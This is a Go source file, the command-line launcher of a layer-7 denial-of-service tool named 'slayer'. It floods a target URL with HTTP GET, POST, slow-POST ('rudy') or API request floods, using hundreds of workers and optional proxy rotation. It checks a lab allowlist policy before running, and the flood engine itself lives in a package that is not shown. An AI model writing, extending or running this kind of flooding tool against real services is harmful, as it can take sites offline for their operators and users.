package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/kjsst/sh-mvdos/internal/guard"
	"github.com/kjsst/sh-mvdos/internal/worker"
)

func main() {
	target := flag.String("t", "", "target URL (e.g. https://example.com)")
	method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood")
	workerCount := flag.Int("w", 500, "number of workers")
	dur := flag.Int("d", 300, "duration in seconds")
	proxyFile := flag.String("p", "", "proxy file path (optional, direct if omitted)")
	policyPath := flag.String("policy", "data/lab-policy.yaml", "lab policy for allowlist check")
	flag.Parse()

	if *target == "" {
		fmt.Fprintln(os.Stderr, "usage: slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]")
		fmt.Fprintln(os.Stderr, "methods: httpget | httppost | rudy | apiflood")
		flag.PrintDefaults()
		os.Exit(1)
	}

	mode := strings.ToLower(strings.TrimSpace(*method))
	switch mode {
	case "httpget", "get", "httppost", "post", "rudy", "apiflood", "api":
	default:
		fmt.Fprintf(os.Stderr, "unknown method: %s\n", *method)
		os.Exit(1)
	}
	switch mode {
	case "get":
		mode = "httpget"
	case "post":
		mode = "httppost"
	case "api":
		mode = "apiflood"
	}

	ctx, err := guard.MustAuthorize(guard.Config{
		PolicyPath: *policyPath,
		TargetURL:  *target,
		Vector:     "slayer",
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "refused: %v\n", err)
		os.Exit(guard.ExitCode(err))
	}

	proxyPath := strings.TrimSpace(*proxyFile)
	if proxyPath == "" {
		if env := os.Getenv("PROXY_FILE"); env != "" {
			proxyPath = env
		}
	}

	fmt.Printf("slayer → %s mode=%s workers=%d duration=%ds proxies=%s\n",
		*target, mode, *workerCount, *dur, proxyLabel(proxyPath))

	runCtx, cancel := context.WithTimeout(ctx, time.Duration(*dur)*time.Second)
	defer cancel()
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		cancel()
	}()

	w := worker.L7Abuser{
		Target:    *target,
		Workers:   *workerCount,
		BatchSize: 1,
		Mode:      mode,
		ProxyFile: proxyPath,
	}
	start := time.Now()
	reqs, errs, _ := w.Run(runCtx)
	fmt.Printf("done: requests=%d errors=%d elapsed=%s\n", reqs, errs, time.Since(start).Round(time.Second))
}

func proxyLabel(path string) string {
	if path == "" {
		return "DIRECT"
	}
	return path
}